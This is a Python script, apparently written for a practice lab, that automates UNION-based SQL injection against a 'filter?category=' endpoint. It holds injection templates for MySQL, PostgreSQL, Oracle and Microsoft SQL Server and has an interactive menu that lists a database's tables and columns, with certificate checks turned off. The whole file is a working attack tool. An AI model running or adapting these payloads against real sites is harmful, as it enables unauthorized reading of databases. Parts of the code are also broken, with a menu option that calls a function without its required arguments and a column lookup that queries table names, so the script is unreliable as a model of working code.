import requests
import sys
from bs4 import BeautifulSoup
import re

list_databases={
   'MySQL':{'dbVersColumn':'@@version',
            'dbVersTable':'',
            'dbConcat':' ',
            'dbTables':'FROM information_schema.tables',
            'dbColumns':'FROM information_schema.columns'},
   'PostgreSQL':{'dbVersColumn':'version()',
            'dbVersTable':'',
            'dbConcat':'||',
            'dbTables':'FROM information_schema.tables',
            'dbColumns':'FROM information_schema.columns'},
   'Oracle':{'dbVersColumn':'banner',
            'dbVersTable':'FROM v$version',
            'dbConcat':'||',
            'dbTables':'FROM all_tables',
            'dbColumns':'FROM all_tab_columns'},
   'Microsoft':{'dbVersColumn':'@@version',
            'dbVersTable':'',
            'dbConcat':'+',
            'dbTables':'FROM information_schema.tables',
            'dbColumns':'FROM information_schema.columns'}
}

listTables = []
listColumns = []
vTableId =-1

menu_options = {
    1: 'List of Tables',
    2: 'List of Columns',
    3: 'Option 3',
    4: 'Exit',
}

def print_menu():
    for key in menu_options.keys():
        print (key, '--', menu_options[key] )

def option1(url,num_col,string_column,sqlDB):
    print(sqlDB)
    listTables.clear()
    path = "filter?category="
    payload_list = ['null'] * num_col
    payload_list[string_column-1] = "table_name"
    sql_payload = "' union select " + ','.join(payload_list) + " " + list_databases[sqlDB]['dbTables']+" -- -"
    print(url + path + sql_payload)
    r = requests.get(url + path + sql_payload, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    print(soup)
    database_version = soup.findAll("td")
    i=1
    for li in database_version:
        listTables.append(li.text)
        print(i,li.text)
        i=i+1
        
    option = int(input('Select a Table: '))
    print('Table Selected: '+listTables[option-1])

def option2(url,num_col,string_column,sqlDB):
    listColumns.clear()
    path = "filter?category="
    payload_list = ['null'] * num_col
    payload_list[string_column-1] = "table_name"
    sql_payload = "' union select " + ','.join(payload_list) + " "+list_databases[sqlDB]['dbTables']+" -- -"
    #print(url + path + sql_payload)
    r = requests.get(url + path + sql_payload, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    #print(soup)
    database_version = soup.findAll("tr")
    i=1
    for li in database_version:
        listColumns.append(li.text)
        print(i,li.text)
        i=i+1
        
    option = int(input('Select a Table: '))
    print('Table Selected: '+listColumns[option-1])

def option3():
     print('Handle option \'Option 3\'')

def menuSQLi(url,num_col,string_column,sqlDb):
    
    while(True):
        print_menu()
        option = ''
        try:
            option = int(input('Enter your choice: '))
        except:
            print('Wrong input. Please enter a number ...')
        #Check what choice was entered and act accordingly
        if option == 1:
            print('La BD ',sqlDb)
            option1(url,num_col,string_column,sqlDb)
        elif option == 2:
            option2()
        elif option == 3:
            option3()
        elif option == 4:
            print('Thanks message before exiting')
            exit()
        else:
            print('Invalid option. Please enter a number between 1 and 4.')